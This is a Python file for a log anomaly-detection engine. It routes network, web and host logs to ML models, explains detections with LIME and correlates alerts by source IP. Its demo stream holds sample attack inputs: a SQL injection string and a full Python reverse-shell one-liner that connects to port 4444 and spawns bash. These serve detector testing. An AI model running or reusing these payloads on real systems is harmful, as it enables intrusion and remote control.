import joblib
import os
import pandas as pd
import numpy as np
from datetime import datetime, timedelta
from lime.lime_text import LimeTextExplainer

class AssetLoader:
    def __init__(self):
        self.base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        self.registry = {
            "L3_L4": {"mdl": "network_flow/iforest_v1.pkl", "vec": None},
            "WEB_APP": {"mdl": "network_app/svm_v1.pkl", "vec": "network_app/tfidf_v1.pkl"},
            "HOST_LIN": {"mdl": "host_linux_mac/svm_v1.pkl", "vec": "host_linux_mac/tfidf_v1.pkl"},
            "HOST_WIN": {"mdl": "host_windows/svm_v1.pkl", "vec": "host_windows/tfidf_v1.pkl"}
        }
        self.cache_mdl = {}
        self.cache_vec = {}

    def fetch(self, tag):
        reg_tag = "HOST_LIN" if "LINUX" in tag else tag
        reg_tag = "HOST_WIN" if "WINDOWS" in tag else reg_tag

        if reg_tag not in self.cache_mdl:
            cfg = self.registry.get(reg_tag)
            if not cfg: return None, None
            
            path_mdl = os.path.join(self.base, cfg["mdl"])
            path_vec = os.path.join(self.base, cfg["vec"]) if cfg["vec"] else None
            
            if not os.path.exists(path_mdl):
                print(f"[ERROR] Missing artifact: {path_mdl}")
                return None, None
            
            print(f"[LOADER] Booting {reg_tag} specialist...")
            self.cache_mdl[reg_tag] = joblib.load(path_mdl)
            self.cache_vec[reg_tag] = joblib.load(path_vec) if path_vec else None
            
        return self.cache_mdl[reg_tag], self.cache_vec[reg_tag]

class ChakshuFusion:
    def __init__(self):
        self.loader = AssetLoader()
        self.explainer = LimeTextExplainer(class_names=['Anomaly', 'Normal'], split_expression=r'\s+')
        self.history = []
        self.win_size = 60
        self.weights = {"L3_L4": 1, "WEB_APP": 2, "HOST_LIN": 3, "HOST_WIN": 3}

    def check_os(self, payload):
        win_sig = ["C:\\", ".exe", ".dll", "EventID", "Microsoft"]
        lin_sig = ["/var/log", "systemd", "pam_unix", "sshd", "root", "/tmp"]
        if any(s in payload for s in win_sig): return "HOST_WIN"
        if any(s in payload for s in lin_sig): return "HOST_LIN"
        return None

    def get_proba_fn(self, mdl, vec):
        def predict_proba(texts):
            x = vec.transform(texts)
            dist = mdl.decision_function(x)
            prob_norm = 1 / (1 + np.exp(-dist))
            return np.vstack([1 - prob_norm, prob_norm]).T
        return predict_proba

    def process_frame(self, log):
        payload = log.get("payload", "")
        tag = log.get("act", "L3_L4")
        src_ip = log.get("src_ip", "0.0.0.0")
        ts_raw = log.get("ts", datetime.now().isoformat())
        
        try:
            ts = datetime.fromisoformat(ts_raw.replace('Z', ''))
        except:
            ts = datetime.now()

        if "HOST" in tag:
            detected = self.check_os(payload)
            if detected: tag = detected

        mdl, vec = self.loader.fetch(tag)
        if not mdl: return None

        if tag == "L3_L4":
            cols = ['dst_pt', 'b_in', 'b_out']
            vals = [log.get("dst_pt", 0), log.get("b_in", 0), log.get("b_out", 0)]
            x_df = pd.DataFrame([vals], columns=cols)
            pred = mdl.predict(x_df)[0]
            base_score = 1.0 if pred == -1 else 0.0
        else:
            x_vec = vec.transform([payload])
            pred = mdl.predict(x_vec)[0]
            base_score = 1.0 if pred == -1 else 0.0

        forensics = []
        if base_score > 0.5 and vec:
            try:
                fn = self.get_proba_fn(mdl, vec)
                # FIX: Explicitly pass labels=[0] so LIME calculates weights for the Anomaly class
                exp = self.explainer.explain_instance(
                    payload, 
                    fn, 
                    labels=(0,), 
                    num_features=5, 
                    num_samples=1000
                )
                forensics = [str(text) for text, weight in exp.as_list(label=0) if weight > 0]
            except Exception as e:
                # Fallback if LIME math fails due to payload length or boundary edge cases
                forensics = ["Structural Anomaly (XAI Timeout)"]

        bonus = 0.0
        cutoff = ts - timedelta(seconds=self.win_size)
        self.history = [h for h in self.history if h["ts"] > cutoff]
        
        for prev in self.history:
            if prev["src_ip"] == src_ip and prev["tag"] != tag:
                bonus = 0.3
                break

        w = self.weights.get(tag, 1)
        final_score = min(1.0, (base_score * w / 3.0) + bonus)
        
        alert = {
            "ts": ts,
            "src_ip": src_ip,
            "tag": tag,
            "score": round(final_score, 2),
            "is_anomaly": final_score > 0.3,
            "forensics": forensics if forensics else ["Structural Anomaly"],
            "payload": payload[:50]
        }

        if alert["is_anomaly"]:
            self.history.append(alert)
        
        return alert

if __name__ == "__main__":
    engine = ChakshuFusion()
    
    stream = [
        {"act": "L3_L4", "src_ip": "10.0.0.5", "dst_pt": 6667, "b_in": 9999, "b_out": 9999},
        {"act": "WEB_APP", "src_ip": "10.0.0.5", "payload": "GET /admin?user=' OR '1'='1' HTTP/1.1"},
        {"act": "HOST_LINUX", "src_ip": "10.0.0.5", "payload": "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"}
    ]

    print("--- Chakshu Fusion Stream Active ---\n")
    for frame in stream:
        res = engine.process_frame(frame)
        if res and res["is_anomaly"]:
            print(f"[{res['ts'].strftime('%H:%M:%S')}] {res['tag']} | Score: {res['score']} | IP: {res['src_ip']}")
            print(f" > Evidence: {res['forensics']}")
            print(f" > Snippet: {res['payload']}\n")
